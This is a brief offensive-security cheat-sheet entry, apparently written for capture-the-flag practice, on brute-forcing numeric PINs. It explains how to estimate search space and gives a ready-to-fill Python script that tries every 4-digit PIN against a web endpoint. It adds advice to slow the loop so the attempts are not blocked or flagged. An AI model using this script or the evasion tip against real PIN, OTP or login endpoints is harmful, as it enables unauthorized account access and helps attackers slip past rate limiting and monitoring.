# Brute Force Attacks

Search space = `charset_size ^ password_length`. Useful to gut-check whether brute is viable before you start — 4-digit PIN (10^4 = 10,000) is trivial; 8-char lowercase (26^8 = ~200B) is not.

When the target is a bounded numeric space (PINs, OTPs, short codes) and no lockout is in place, script it directly. Template for GET with query param — tweak `ip`, `port`, endpoint, param name, and success condition:

```python
import requests

ip = "<TARGET>"
port = <PORT>

for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    response = requests.get(f"http://{ip}:{port}/<endpoint>?pin={formatted_pin}")
    if response.ok and 'flag' in response.json():
        print(f"Found: {formatted_pin} | Flag: {response.json()['flag']}")
        break
```

```bash
python3 pin-solver.py
```

> [!warning] No rate limiting + no lockout = brute viable. If either exists, slow the loop (`time.sleep()`) or this gets you blocked and flagged.